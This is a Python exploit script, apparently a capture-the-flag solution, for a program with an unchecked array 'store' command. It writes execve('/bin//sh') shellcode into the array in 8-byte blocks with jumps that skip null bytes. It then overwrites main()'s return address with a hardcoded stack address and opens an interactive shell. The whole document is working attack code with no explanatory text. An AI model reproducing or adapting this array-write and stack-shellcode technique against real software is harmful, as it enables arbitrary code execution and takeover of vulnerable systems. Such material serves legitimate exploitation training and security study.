import interact
import struct

# Store value at index in array
def store(p, i, v):
    if i >= 0:
        data = p.readuntil('Input command:')
        p.sendline('store')
        data = p.readuntil('Number:')
        p.sendline(str(v))
        data = p.readuntil('Index:')
        p.sendline(str(i))

p = interact.Process()

# Shellcode in blocks of 8 bytes, with strategic jumps to skip null bytes
gadgets = [
    0x90900909, 0x04ebf631, # xor esi,esi
    0x90e78948, 0x04eb9090, # mov rdi,rsp
    0x70ef8166, 0x05eb9001, # sub di,0x17c
    0x90d23190, 0x04eb9090, # xor edx, edx
    0x90f63148, 0x909007eb, # xor rsi,rsi
    0xc0314890, 0x04eb3bb0, # mov al, 0x3b
    0x9090050f, 0x90909090, # syscall
    0x6e69622f, 0x68732f2f, # /bin//sh
]

# Store gadgets in array, skipping restricted indices
for i in range(len(gadgets)/2):
    store(p, (i*3)-1, gadgets[(i*2)])
    store(p, (i*3), gadgets[(i*2)+1])

# Overwrite return address of main() to stack pointer 0x7fffffffec20
store(p, 110, 0xffffec28)
store(p, 111, 0x7fff)

data = p.readuntil('Input command:')
p.sendline('quit')

p.interactive()